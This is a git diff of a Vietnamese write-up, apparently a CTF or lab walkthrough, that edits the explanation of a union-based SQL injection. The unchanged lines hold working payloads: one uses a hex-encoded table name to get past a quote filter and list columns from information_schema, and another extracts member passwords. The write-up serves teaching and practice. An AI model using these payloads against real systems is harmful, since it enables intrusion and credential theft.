@@ -34,13 +34,13 @@ Kết quả là cột 1,2,4 bị lỗi. Cột email thì có dạng string, 2 c�
 
 ![image](https://user-images.githubusercontent.com/115911041/233362366-e0c63fa3-c5f7-4509-9897-ec99df015d01.png)
 
-Column member cho ra kết quả là member.Kế đó ta tiếp tục khai thác cột khác nhưng vấn đề là bị filter đi dấu `'`, nên ta phải chuyển sang member dạng Hex
+Thấy kết quả trả về là 1 bảng member.Kế đó ta tiếp tục khai thác `column_name` từ bảng `member` nhưng vấn đề là bị filter đi dấu `'`, nên ta phải chuyển sang member dạng Hex
 
 `And 1=0 union all select 1,2,3,(select group_concat(column_name) from information_schema.columns where table_name=0x6d656d626572)-- --`
 
 ![image](https://user-images.githubusercontent.com/115911041/233365320-e7e34155-4dc9-47d7-95d6-9e767bd09d0d.png)
 
-Tiếp theo ta sẽ lấy data
+Kết quả xuất hiện 4 columns, nhưng quan trọng ở đây là `memeber_login` và `member_password`.
 
 `And 1=0 union all select 1,2,3,(select member_password from member)-- --`
 
